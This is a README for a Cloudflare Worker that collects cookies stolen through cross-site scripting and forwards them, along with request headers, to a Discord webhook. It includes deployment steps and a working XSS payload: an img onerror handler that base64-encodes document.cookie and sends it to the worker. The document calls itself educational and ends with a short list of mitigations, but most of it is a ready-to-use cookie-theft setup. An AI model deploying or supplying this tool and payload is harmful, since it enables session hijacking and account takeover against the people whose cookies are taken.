# XSS-Endpoint

A Cloudflare Worker that demonstrates how Cross-Site Scripting (XSS) vulnerabilities can be exploited to capture cookies and send them to a Discord webhook.

**IMPORTANT: This project is for educational purposes only 🧑‍🎓. Do not use this for malicious activities.**

## Description

This project creates a simple endpoint deployed as a Cloudflare Worker that can receive cookies from XSS attacks and forward them to a Discord webhook. It demonstrates how attackers could potentially steal sensitive information through XSS vulnerabilities.

## Features

- Captures cookies from XSS payloads
- Collects request headers and URL information
- Sends data to a Discord webhook in a formatted JSON payload
- Easy deployment with Cloudflare Workers

## Prerequisites

- [Node.js](https://nodejs.org/) (latest LTS version recommended)
- [npm](https://www.npmjs.com/) (comes with Node.js)
- A [Cloudflare account](https://dash.cloudflare.com/sign-up)
- A [Discord webhook URL](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)

## Setup

1. Clone this repository
2. Install dependencies:
   ```bash
   npm install
   ```
3. Configure your Discord webhook:
   ```bash
   npm run setup
   ```
   When prompted, paste your Discord webhook URL
4. Deploy to Cloudflare:
   ```bash
   npm run deploy
   ```

## Local Development

To run the worker locally for testing:

```bash
npm start
```

This will start a local development server, typically at http://localhost:8787.

## Testing

Run tests with:

```bash
npm test
```

## Example XSS Payload

After deployment, you can test the worker with a payload like:

```html
<img src="x" onerror="this.src='https://your-worker-domain/?cookie=' + btoa(document.cookie);this.removeAttribute('onerror');" />
```

Replace `your-worker-domain` with the domain assigned by Cloudflare to your worker.

## How It Works

1. The worker listens for HTTP requests
2. When a request contains "cookie" in the URL, it:
   - Extracts cookies from the URL parameter (base64 encoded)
   - Collects request headers and URL information
   - Formats the data as JSON
   - Sends it to the configured Discord webhook

## Security Notice

This project demonstrates a security vulnerability. In real applications, you should:

- Implement proper Content Security Policy (CSP)
- Sanitize user inputs
- Set the HttpOnly flag on sensitive cookies
- Use SameSite cookie attributes
